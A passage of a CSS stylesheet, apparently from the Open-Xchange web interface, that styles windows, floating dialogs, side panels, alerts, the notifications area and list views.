            background-color: #f5f5f5;
            border-bottom: 1px solid #cfcfcf;
            padding: 8px 0;
            z-index: 2;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
        }

        .window-container.header-top .window-header h1.title {
            margin: 0.2em 0;
            font-size: 20px;
            float: left;
        }

        .window-container.header-top .window-header .btn {
            min-width: 80px;
            margin-right: 8px;
            height: 32px;
        }

        .window-container.header-top .window-content {
            overflow-y: scroll !important;
        }

        .window-container.header-top .window-content.scrollable-disabled {
            overflow: hidden !important;
        }

        .window-container.header-bottom .window-body {
            bottom: 64px;
            top: 0;
        }

        .window-container.header-bottom .window-header {
            display: none;
        }

        .window-container.header-bottom .window-footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 64px;
            background-color: #f5f5f5;
            border-top: 1px solid #cfcfcf;
            padding: 16px 0;
            z-index: 2;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.1);
        }

        .window-container.header-bottom .window-footer h1.title {
            margin: 0.2em 0;
            font-size: 20px;
            float: left;
        }

        .window-container.header-bottom .window-footer .btn {
            min-width: 80px;
            margin-right: 8px;
            height: 32px;
        }

        .window-container.header-bottom .window-content {
            overflow-y: scroll !important;
        }

        .window-container.header-bottom .window-content.scrollable-disabled {
            overflow: hidden !important;
        }

        .window-container.classic {
            color: white;
        }

        .window-container.classic .window-head {
            width: auto;
            right: 0;
            height: 30px;
            color: white;
            border-top: 1px solid #000;
            padding: 7px 0 11px 0;
            text-align: center;
        }

        .window-container.classic .window-head .toolbar-button {
            display: none;
        }

        .window-container.classic .window-body {
            top: 50px;
            left: 0;
        }

        .window-container.simple-window {
            position: relative;
            z-index: 11;
        }

        .window-container-center {
            position: relative;
            margin: 0 auto 0 auto;
            width: 100% !important;
            max-width: 100%;
            height: 100%;
        }

        #io-ox-windowmanager.fullscreen .window-container-center {
            width: 100% !important;
        }

        .window-blocker {
            background-color: rgba(255, 255, 255, 0.8);
            z-index: 30;
        }

        .window-blocker .progress {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 400px;
            height: 8px;
            margin-left: -200px;
        }

        @media (max-width: 540px),
        (max-device-width: 540px) {
            .window-blocker .progress {
                width: 150px;
                margin-left: -75px;
            }
        }

        .window-blocker .header {
            top: auto;
            bottom: 50%;
            margin-bottom: 30px;
            text-align: center;
        }

        .window-blocker .footer {
            top: 50%;
            bottom: auto;
            margin-top: 8px;
            text-align: center;
        }

        .floating-window .window-blocker .footer {
            top: calc(50% - 40px);
        }

        .window-blocker .footer .block-message {
            margin: 0 32px 16px 32px;
        }

        .window-blocker .footer .block-message .message {
            margin-bottom: 32px;
        }

        .window-blocker .footer .block-message .actions .btn+.btn {
            margin-left: 5px;
        }

        .window-blocker .first {
            margin-top: -20px;
        }

        .window-blocker .second {
            margin-top: -5px;
            height: 4px;
        }

        .window-blocker .second .progress-bar {
            background-color: #555;
        }

        .window-blocker .progress .progress-bar {
            border-radius: 2px;
        }

        .window-sidepanel {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 0;
            z-index: 2;
            overflow: hidden;
            display: none;
            background-color: #f5f5f5;
        }

        .window-sidepanel.visible {
            display: flex;
            flex-direction: column;
            overflow: visible;
            width: 250px;
        }

        .window-sidepanel.visible+.window-body {
            left: 250px;
        }

        .window-sidepanel .folder-tree {
            position: static;
            flex: 1;
        }

        .window-sidepanel .resizebar {
            background: transparent;
            width: 5px;
            height: 100%;
            position: absolute;
            z-index: 1;
            float: right;
            cursor: e-resize;
            cursor: ew-resize;
            cursor: col-resize;
            top: 0;
            right: -3px;
            bottom: 0;
        }

        .window-sidepanel .generic-toolbar {
            flex: 0 0 auto;
            position: static;
        }

        .window-sidepanel .generic-toolbar.bottom {
            border-color: rgba(0, 0, 0, 0.1);
            background-color: #f8f8f8;
        }

        .window-sidepanel .generic-toolbar.premium-toolbar {
            height: auto;
            line-height: 16px;
            background-color: #cc6d00;
            padding: 0 0 8px 0;
        }

        .window-sidepanel .generic-toolbar.premium-toolbar .header {
            margin: 0 0 16px 0;
            padding: 0 16px;
            background-color: #f80;
            color: #fff;
            line-height: 40px;
        }

        .window-sidepanel .generic-toolbar.premium-toolbar p {
            padding: 0 16px;
            margin: 0 0 8px 0;
        }

        .window-sidepanel .generic-toolbar.premium-toolbar a:not(.btn-default) {
            color: #fff;
        }

        .window-sidepanel .generic-toolbar.premium-toolbar .io-ox-upsell-link {
            display: block;
            padding: 4px 16px 0 16px;
        }

        .window-panel {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1;
        }

        .window-body {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            white-space: normal;
            z-index: 1;
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }

        .window-content {
            top: 0;
            z-index: 2;
            background-color: #fff;
            overflow: hidden;
            outline: 0;
        }

        .window-content textarea {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
            resize: none;
        }

        .leftside {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 320px;
            background-color: #fff;
            overflow: hidden;
        }

        .rightside {
            outline: 0;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 320px;
            background-color: #fff;
            overflow: auto;
        }

        .floating-window {
            position: fixed;
            z-index: 12;
            background: transparent;
            outline: 0;
            max-height: 100%;
            border-radius: 6px;
            width: 920px;
            height: 750px;
            right: auto;
            bottom: auto;
            top: calc(50% - 375px);
        }

        .floating-window .floating-window-content,
        .floating-window .floating-window-content {
            border-radius: 6px;
        }

        .floating-window .window-container-center,
        .floating-window .window-footer,
        .floating-window .floating-body {
            border-radius: 0 0 6px 6px;
        }

        .floating-window .container {
            padding-left: 20px;
            padding-right: 20px;
        }

        .floating-window .floating-window-content {
            box-shadow: 0 10px 20px 5px rgba(0, 0, 0, 0.2);
        }

        .floating-window.active {
            z-index: 14;
        }

        .floating-window.active .floating-window-content {
            box-shadow: 0 15px 70px 10px rgba(0, 0, 0, 0.5);
        }

        .floating-window.active .floating-header {
            background-color: #f5f5f5;
            background-image: linear-gradient(0deg, #f5f5f5, #fff);
        }

        .floating-window.active .floating-header h1 {
            color: #333;
        }

        .floating-window.active .floating-header .controls button {
            color: #707070;
        }

        .floating-window .window-body,
        .floating-window .container {
            width: 100%;
        }

        .floating-window.height-md {
            height: 650px;
        }

        .floating-window.width-xs {
            width: 640px;
            left: calc(50% - 320px);
        }

        .floating-window.width-sm {
            width: 720px;
            left: calc(50% - 360px);
        }

        .floating-window.width-md {
            width: 800px;
            left: calc(50% - 400px);
        }

        .floating-window.width-lg {
            width: 920px;
            left: calc(50% - 460px);
        }

        @media (min-width: 1280px) {
            .floating-window.width-lg {
                width: 1040px;
                left: calc(50% - 520px);
            }
        }

        .floating-window .floating-header .controls button[data-action="normal"] {
            display: none;
        }

        .floating-window .container {
            width: 100% !important;
            position: relative;
            min-width: auto;
        }

        .floating-window.width-xs:not(.maximized) [data-hidden="xs"] {
            display: none;
        }

        .floating-window.maximized {
            width: 1060px;
            height: calc(100% - 72px);
            max-width: 100%;
            max-height: 1200px;
            top: 0px;
            left: calc(50% - 530px);
        }

        @media (max-height: 750px) {
            .floating-window.maximized {
                height: 100%;
                top: 0 !important;
            }
        }

        .floating-window.maximized .floating-header .controls button[data-action="maximized"] {
            display: none;
        }

        .floating-window.dragging iframe {
            pointer-events: none;
        }

        .ios .floating-window.header-top .window-header {
            position: relative;
        }

        .floating-window .floating-header {
            height: 40px;
            bottom: auto;
            background: #f5f5f5;
            padding: 0 12px 0 20px;
            display: flex;
            border-radius: 6px 6px 0px 0px;
            border: 1px solid rgba(0, 0, 0, 0.15);
            border-width: 0 1px 1px 1px;
            cursor: move;
        }

        .floating-window .floating-header h1 {
            margin: 0;
            padding: 0;
            font-size: 13px;
            font-weight: bold;
            line-height: 40px;
            color: #636363;
            text-overflow: ellipsis;
            overflow: hidden;
            white-space: nowrap;
        }

        .floating-window .floating-header .count {
            padding: 3px 7px;
            position: relative;
            top: -1px;
            margin-left: 8px;
        }

        .floating-window .floating-header .controls {
            margin-left: auto;
            flex-shrink: 0;
        }

        .floating-window .floating-header .controls button {
            color: #707070;
            line-height: 38px;
            padding: 0 8px;
            display: inline-block;
        }

        .floating-window .floating-header .controls button[data-action="close"] {
            font-size: 18px;
        }

        .floating-window .floating-header .controls button:focus {
            box-shadow: none;
            outline: 2px solid #a0a0a0;
            outline-offset: -4px;
        }

        .floating-window .floating-body {
            top: 40px;
            background-color: white;
            border: 1px solid rgba(0, 0, 0, 0.15);
            border-width: 0 1px 1px 1px;
        }

        #floating-window-backdrop {
            z-index: 13;
            height: 100%;
            width: 100%;
            top: 0;
            background-color: rgba(255, 255, 255, 0.01);
            position: absolute;
        }

        .rightside-navbar {
            display: none;
        }

        @media (max-width: 900px) {
            .leftside {
                width: 250px;
            }

            .rightside {
                left: 250px;
            }

            #io-ox-taskbar-container #io-ox-taskbar {
                padding: 0 4px;
            }

            #io-ox-taskbar-container #io-ox-taskbar li {
                margin-left: 4px;
            }
        }

        @media (min-width: 1300px) {
            .leftside {
                width: 400px;
            }

            .rightside {
                left: 400px;
            }
        }

        @media (min-width: 1500px) {
            .leftside {
                width: 450px;
            }

            .rightside {
                left: 450px;
            }
        }

        @media (min-width: 1700px) {
            .leftside {
                width: 500px;
            }

            .rightside {
                left: 500px;
            }
        }

        @media (max-width: 540px) {
            .window-body {
                bottom: 40px;
                left: 0;
            }

            .chromeless-window .window-body {
                bottom: 0;
            }

            .vsplit {
                left: 0;
                width: 200%;
                right: auto;
                -webkit-animation-timing-function: ease-out;
                -webkit-animation-duration: 350ms;
                animation-timing-function: ease-out;
                animation-duration: 350ms;
            }

            .vsplit-slide {
                -webkit-transform: translateX(-50%);
                -webkit-animation-name: slideright;
                transform: translateX(-50%);
                animation-name: slideright;
            }

            .vsplit-reverse {
                -webkit-transform: translateX(0);
                -webkit-animation-name: slideleft;
                transform: translateX(0);
                animation-name: slideleft;
            }

            .touch .vsplit {
                -webkit-backface-visibility: hidden;
            }

            .vsplit .leftside {
                width: 50%;
                right: auto;
                z-index: 1;
            }

            .vsplit .rightside {
                left: 50%;
                width: 50%;
                top: 41px;
                right: auto;
                z-index: 2;
            }

            .vsplit .rightside-navbar {
                position: absolute;
                top: 0;
                left: 50%;
                width: 50%;
                height: 41px;
                background-color: #fff;
                border-bottom: 1px solid #ccc;
                padding: 5px 13px 5px 13px;
                z-index: 2;
                line-height: 2em;
                display: block;
            }

            .vsplit-reverse .rightside-navbar,
            .vsplit-reverse .rightside {
                display: none;
            }
        }

        @media (max-width: 540px) and (orientation: portrait),
        (max-height: 540px) and (orientation: landscape) {
            .window-sidepanel {
                display: block;
                -webkit-backface-visibility: hidden;
            }
        }

        body,
        .classic-toolbar,
        .list-view {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .window-body,
        .io-ox-sidepopup,
        .detail-view-header {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }

        .breadcrumb-view {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }

        .toolbar .breadcrumb-view {
            margin: 0;
        }

        .generic-toolbar .breadcrumb-view.toolbar-item {
            margin: 0 16px;
            padding: 0;
        }

        .breadcrumb-label,
        .breadcrumb-item,
        .breadcrumb-ellipsis,
        .breadcrumb-divider,
        .breadcrumb-tail {
            color: #767676;
        }

        .breadcrumb-ellipsis,
        .breadcrumb-label {
            margin-right: 8px;
        }

        .breadcrumb-tail {
            color: #333;
            font-weight: bold;
        }

        .breadcrumb-divider {
            margin: 0 8px;
            width: 8px;
            text-align: center;
        }

        .breadcrumb-divider:before {
            content: "\f105";
        }

        .breadcrumb-link,
        .breadcrumb-divider {
            display: inline-block;
        }

        .io-ox-alert {
            position: fixed;
            top: 15px;
            left: 50%;
            margin-left: -230px;
            width: 460px;
            background-color: rgba(255, 255, 255, 0.95);
            z-index: 65500;
            box-shadow: 0 0 50px -1px rgba(0, 0, 0, 0.8);
            outline: 0;
            opacity: 0;
            border-radius: 3px;
            -webkit-transition: opacity 0.2s ease-out;
            -o-transition: opacity 0.2s ease-out;
            transition: opacity 0.2s ease-out;
        }

        .io-ox-alert:focus {
            background-color: #fff;
        }

        .io-ox-alert.appear {
            opacity: 1;
        }

        .io-ox-alert .headline {
            margin: 0 0 7px 0;
            font-size: 14px;
            line-height: 20px;
        }

        .io-ox-alert .message {
            padding: 25px 60px 25px 70px;
            min-height: 60px;
        }

        .io-ox-alert .message>div {
            max-height: 300px;
            overflow: auto;
        }

        .io-ox-alert .message>div+div {
            margin-top: 7px;
        }

        .io-ox-alert .message>div a {
            cursor: pointer;
        }

        .io-ox-alert .message>div i.fa+span {
            margin-left: 15px;
        }

        .io-ox-alert .icon {
            position: absolute;
            top: 18px;
            left: 10px;
            font-size: 24px;
            color: #aaa;
            width: 50px;
            text-align: center;
        }

        .io-ox-alert .close {
            position: absolute;
            top: 15px;
            right: 15px;
            width: 36px;
            line-height: 40px;
            text-align: center;
            display: inline-block;
            outline: 0;
        }

        .io-ox-alert .close:hover,
        .io-ox-alert .close:focus {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .io-ox-alert.io-ox-alert-info .icon {
            color: #08c;
        }

        .io-ox-alert.io-ox-alert-error .icon {
            color: #a00;
        }

        .io-ox-alert.io-ox-alert-warning .icon {
            color: #fc0;
        }

        .io-ox-alert.io-ox-alert-success .icon {
            color: #92d050;
        }

        .io-ox-alert.io-ox-alert-busy .icon {
            color: #555;
        }

        .io-ox-alert.io-ox-alert-success {
            cursor: pointer;
        }

        @media (max-width: 540px),
        (max-device-width: 540px) {
            .io-ox-alert {
                left: 10px;
                right: 10px;
                width: auto;
                margin-left: 0;
                cursor: pointer;
            }

            .io-ox-alert .icon {
                font-size: 20px;
                width: 30px;
            }

            .io-ox-alert .message {
                padding: 20px 20px 20px 50px;
            }

            .io-ox-alert .close {
                display: none;
            }
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display {
            color: #333;
            font-size: 14px;
            background-color: #fff;
            background-clip: padding-box;
            overflow: auto;
            min-height: 200px;
            padding: 24px 14px;
            list-style-type: none;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display:focus {
            outline: 0;
        }

        @media (min-width: 541px) {
            #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display {
                width: 350px;
            }
        }

        @media (max-width: 540px),
        (max-device-width: 540px) and (orientation: portrait) {
            #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display {
                width: 100%;
                right: 0;
                bottom: 0;
                top: 50px;
                position: fixed;
            }
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .span-to-div {
            display: block;
            line-height: 24px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .span-to-div.location,
        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .span-to-div.title {
            overflow: hidden;
            text-overflow: ellipsis;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .items {
            min-height: 20px;
            margin-bottom: 8px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info {
            padding: 5px 14px 10px 14px;
            background-color: rgba(0, 0, 0, 0.05);
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info .button-wrapper {
            display: flex;
            justify-content: space-between;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info .enable-button,
        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info .disable-button,
        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info .later-button {
            padding: 4px 8px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info.clickable {
            cursor: pointer;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .desktop-notification-info.clickable:hover {
            background-color: rgba(0, 0, 0, 0.08);
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .notification-area-header {
            margin: 0 0 9px 0;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .notification-area-title {
            font-weight: 300;
            font-size: 16px;
            line-height: 20px;
            margin: 0;
            padding: 0 14px;
            border: 0;
            display: inline-block;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .clear-area-button {
            float: right;
            line-height: 20px;
            margin: 0 14px 0 0;
            padding: 0;
            color: #696969;
            font-size: 18px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .hide-area-button {
            padding: 3px 14px 0 14px;
            display: block;
            text-align: left;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .section-title {
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-weight: 300;
            font-size: 16px;
            line-height: 24px;
            margin: 15px 0 1px 0;
            padding: 0 14px;
            border: 0;
            display: inline-block;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .section-title.no-news-message {
            line-height: 20px;
            margin: 0;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .clear-button {
            float: right;
            line-height: 24px;
            margin: 14px 14px 0 0;
            padding: 0;
            color: #696969;
            font-size: 18px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .notifications:first-child {
            margin-top: 0;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item {
            color: #696969;
            padding: 8px 14px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .notification-info {
            display: block;
            color: #696969;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .notification-item-actions {
            height: 16px;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .notification-item-actions .clear-single-button {
            float: right;
            width: 12px;
            line-height: 13px;
            padding: 0;
            color: #696969;
            font-size: 14px;
            display: none;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .notification-item-actions .clear-single-button:focus {
            display: inline-block;
            text-decoration: underline;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .notification-item-actions .clear-single-button:hover {
            display: inline-block;
            text-decoration: underline;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item:last-child {
            border-bottom: 0;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item.has-focus {
            outline: 1px solid rgba(0, 0, 0, 0.3);
            background-color: rgba(0, 0, 0, 0.05);
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item.has-focus .clear-single-button {
            display: inline-block;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item:hover .clear-single-button {
            display: inline-block;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .title {
            color: #333;
            pointer-events: none;
            font-weight: bold;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .subject {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            pointer-events: none;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .empty {
            font-style: italic;
            color: #aaa;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .content {
            color: #aaa;
            line-height: 16px;
            max-height: 80px;
            margin-top: 3px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .time {
            float: right;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .location {
            color: #666;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .actions {
            text-align: right;
            margin: 5px 0;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .item .open-in-calendar {
            padding: 0;
        }

        #io-ox-appcontrol #io-ox-toprightbar #io-ox-notifications-display .open-app {
            padding: 7px 14px;
        }

        @media (max-width: 540px),
        (max-device-width: 540px) and (orientation: portrait) {
            #io-ox-notifications-sidepopup {
                width: 100%;
                bottom: 0;
                top: 50px;
                position: fixed;
            }

            #io-ox-notifications-display {
                padding: 8px 14px 14px 14px;
            }

            #io-ox-notifications-display .notification-area-title {
                font-size: 20px;
            }

            #io-ox-notifications-display .item {
                background-color: rgba(0, 0, 0, 0.05);
                margin-bottom: 8px;
            }

            #io-ox-notifications-display .item .clear-single-button {
                display: inline-block;
            }
        }

        .touch #io-ox-notifications-display .item .clear-single-button {
            display: inline-block;
        }

        .notifications-icon {
            opacity: 1;
            transition: opacity 0.2s linear;
        }

        .notifications-icon.no-notifications {
            opacity: 0;
            visibility: hidden;
        }

        #io-ox-notifications-popups {
            position: absolute;
            top: 48px;
            width: 400px;
            right: 10px;
            z-index: 65201;
        }

        #io-ox-notifications-popups .alert {
            margin-bottom: 0.5em;
            box-shadow: 1px 1px 3px -1px rgba(0, 0, 0, 0.8);
        }

        @media (max-width: 540px) and (orientation: portrait),
        (max-height: 540px) and (orientation: landscape) {
            #io-ox-notifications-popups {
                top: -80px;
                left: 10px;
                right: 10px;
                width: auto;
                margin: 0;
            }
        }

        .list-view-control {
            background-color: #fff;
        }

        .list-view-control .toolbar {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .list-view-control .toolbar.top {
            display: none;
        }

        .list-view-control .toolbar.bottom {
            display: none;
        }

        .list-view-control .toolbar.bottom .dropdown-menu {
            top: auto;
            bottom: 100%;
            right: 0;
            left: auto;
        }

        .list-view-control .toolbar .grid-options {
            padding: 0;
        }

        .list-view-control .toolbar .grid-options>a {
            color: #767676;
            display: block;
            padding-left: 16px;
            padding-right: 16px;
        }

        @media (max-width: 900px) {
            .list-view-control .toolbar .grid-options>a {
                padding-left: 0px;
                padding-right: 8px;
            }
        }

        .list-view-control .toolbar a:not(.breadcrumb-link):focus,
        .list-view-control .toolbar a:not(.breadcrumb-link):focus i {
            color: #f0faff;
            background: #e9f0fa;
            outline: 0;
        }

        .list-view-control .toolbar .select-all {
            color: #767676;
            cursor: pointer;
            white-space: nowrap;
        }

        .list-view-control .toolbar .select-all i {
            color: #767676;
            margin-right: 8px;
            width: 16px;
            font-size: 18px;
            position: relative;
            top: 2px;
        }

        .list-view-control .toolbar .dropdown-menu {
            font-size: 14px;
        }

        .list-view-control.upside-down .toolbar.top {
            display: none;
            top: auto;
            border-bottom: 0;
        }

        .list-view-control.upside-down .toolbar.top .dropdown-menu {
            top: auto;
            bottom: 100%;
            right: 0;
            left: auto;
        }

        .list-view-control.upside-down .toolbar.bottom {
            display: none;
            bottom: auto;
            border-top: 0;
        }

        .list-view-control.upside-down .toolbar.bottom .dropdown-menu {
            top: 90%;
            bottom: auto;
        }

        .list-view-control.toolbar-top-visible .toolbar.top,
        .list-view-control.toolbar-bottom-visible .toolbar.bottom {
            display: block;
            margin-bottom: 0;
        }

        .list-view-control:not(.upside-down).toolbar-top-visible .list-view {
            top: 40px;
        }

        .list-view-control:not(.upside-down).toolbar-bottom-visible .list-view {
            bottom: 35px;
        }

        .list-view-control:not(.upside-down).toolbar-top-visible .list-view>.notification {
            padding-bottom: 40px;
        }

        .list-view-control:not(.upside-down).toolbar-bottom-visible .list-view>.notification {
            padding-top: 35px;
        }

        .list-view-control.upside-down.toolbar-top-visible .list-view {
            bottom: 40px;
        }

        .list-view-control.upside-down.toolbar-bottom-visible .list-view {
            top: 35px;
        }

        .list-view-control .list-view {
            height: auto;
            z-index: 1;
        }

        .list-view-control .resizebar {
            background: transparent;
            width: 5px;
            height: 100%;
            position: relative;
            z-index: 10000;
            float: right;
            cursor: e-resize;
            cursor: ew-resize;
            cursor: col-resize;
            right: -3px;
        }

        .list-view-control .resizebar.vertical {
            display: none;
        }

        .ios .list-view.scrollpane {
            overflow-x: hidden;
        }

        .smartphone .list-view-control .toolbar a:not(.breadcrumb-link):focus,
        .smartphone .list-view-control .toolbar a:not(.breadcrumb-link):focus i {
            color: inherit;
            outline: inherit;
            background-color: inherit;
        }

        .list-view {
            height: 100%;
            list-style-type: none;
            padding: 0;
            margin: 0;
            outline: 0;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .list-view:focus {
            box-shadow: 0 0 1px #aaa inset;
        }

        .list-view.scrollpane {
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
            -webkit-transform: translateZ(0);
        }

        .list-view .list-item,
        .list-view .list-header {
            position: relative;
            font-size: 13px;
            line-height: 20px;
            padding: 6px 15px 5px 48px;
            cursor: pointer;
        }

        .list-view .list-item {
            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
            outline: 0;
        }

        .list-view .list-item .list-item-checkmark {
            z-index: 1;
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 46px;
        }

        .list-view .list-item .list-item-checkmark .fa-checkmark {
            color: #767676;
            position: absolute;
            left: 16px;
            top: 12px;
            font-size: 18px;
        }

        .list-view .list-item .list-item-checkmark .fa-checkmark:before {
            content: "\f096";
        }

        .list-view .notification {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #767676;
        }

        .list-view .notification i.fa-exclamation-triangle {
            font-size: 42px;
            margin-bottom: 8px;
        }

        .list-view.hide-checkboxes .list-item {
            padding-left: 16px;
        }

        .list-view.hide-checkboxes .list-item .list-item-checkmark {
            display: none;
        }

        .list-view.compact .list-item {
            padding-left: 0;
            padding-right: 0;
        }

        .list-view .list-item.selected:not(.no-checkbox) .fa-checkmark {
            color: #07b;
        }

        .list-view .list-item.selected:not(.no-checkbox) .fa-checkmark:before {
            content: "\f14a";
        }

        .list-view .list-item .bold {
            font-weight: bold;
        }

        .list-view .list-item:hover {
            background: #f7f7f7;
            z-index: 9999;
        }

        .list-view.visible-selection .list-item.selected {
            color: #333;
            background-color: #ddd;
            -webkit-font-smoothing: antialiased;
        }

        .list-view.visible-selection .list-item.selected .fa-checkmark {
            color: #626262;
        }

        .list-view.visible-selection .list-item.selected:hover {
            background-color: #e2e2e2;
        }

        .list-view.visible-selection.has-focus .list-item.selected {
            color: #333;
            background-color: #e9f0fa;
        }

        .list-view.visible-selection.has-focus .list-item.selected .gray {
            color: #333;
        }

        .list-view.visible-selection.has-focus .list-item.selected i:not(.color-stable) {
            color: #333;
        }

        .list-view.visible-selection.has-focus .list-item.selected:hover {
            background-color: #f1f6fc;
        }

        .list-view.visible-selection.has-focus .list-item.selected:focus,
        .list-view.visible-selection.has-focus .list-item.selected:focus:hover {
            background-color: #e9f0fa;
        }

        .list-view .list-item-row {
            clear: right;
        }

        .list-view>.list-item:last-child {
            margin-bottom: 100px;
        }

        .list-view.complete>.list-item:last-child {
            margin-bottom: 0;
        }

        .list-view .busy-indicator {
            position: relative;
            font-size: 13px;
            padding: 6px 15px 5px 48px;
            cursor: pointer;
            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
            outline: 0;
            left: 0;
            -webkit-transition: left 0.4s cubic-bezier(0.1, 0.7, 0.1, 1);
            -o-transition: left 0.4s cubic-bezier(0.1, 0.7, 0.1, 1);
            transition: left 0.4s cubic-bezier(0.1, 0.7, 0.1, 1);
            z-index: 2;
            color: #aaa;
            background-color: #f5f5f5;
            font-size: 20px;
            line-height: 20px;
            height: 100px;
            text-align: center;
            padding: 40px 0;
            margin-bottom: 0;
        }

        .list-view .busy-indicator .bold {
            font-weight: bold;
        }

        .list-view .busy-indicator:hover {
            background: #f7f7f7;
            z-index: 9999;
        }

        .list-view .busy-indicator.swipe-left {
            left: -80px;
        }

        .list-view .busy-indicator.io-ox-busy {
            text-align: left;
        }

        .list-view .busy-indicator:nth-child(2) {
            width: 100% !important;
            height: 100% !important;
            background-color: transparent;
        }

        .list-view .busy-indicator:nth-child(2) i {
            display: none;
        }

        .list-view .list-item {
            left: 0;
            -webkit-transition: left 0.4s cubic-bezier(0.1, 0.7, 0.1, 1);
            -o-transition: left 0.4s cubic-bezier(0.1, 0.7, 0.1, 1);
            transition: left 0.4s cubic-bezier(0.1, 0.7, 0.1, 1);
            z-index: 2;
        }

        .list-view .list-item.swipe-left {
            left: -80px;
        }

        .list-view.no-transition .list-item {
            -webkit-transition: none;
            -o-transition: none;
            transition: none;
        }

        .list-view .swipe-left-content {
            background-color: #ff4105;
            position: absolute;
            top: 0;
            right: -80px;
            bottom: 0;
            width: 80px;
            z-index: 1;
        }

        .list-view .swipe-left-content i {
            font-size: 20px;
            color: white;
            position: absolute;
            top: 50%;
            left: 50%;
            margin: -10px 0 0 -7px;
        }

        .list-view .pull-to-refresh {
            position: absolute;
            top: 8px;
            z-index: 10001;
            width: 100%;
        }

        .list-view .pull-to-refresh .spinner {
            width: 50px;
            height: 50px;
            background-color: #c80000;
            border-radius: 25px;
            text-align: center;
            line-height: 50px;
            color: #fff;
            font-size: 24px;
            margin: 0 auto;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.175);
        }

        .list-view .scale-down {
            animation: scaleDown 120ms;
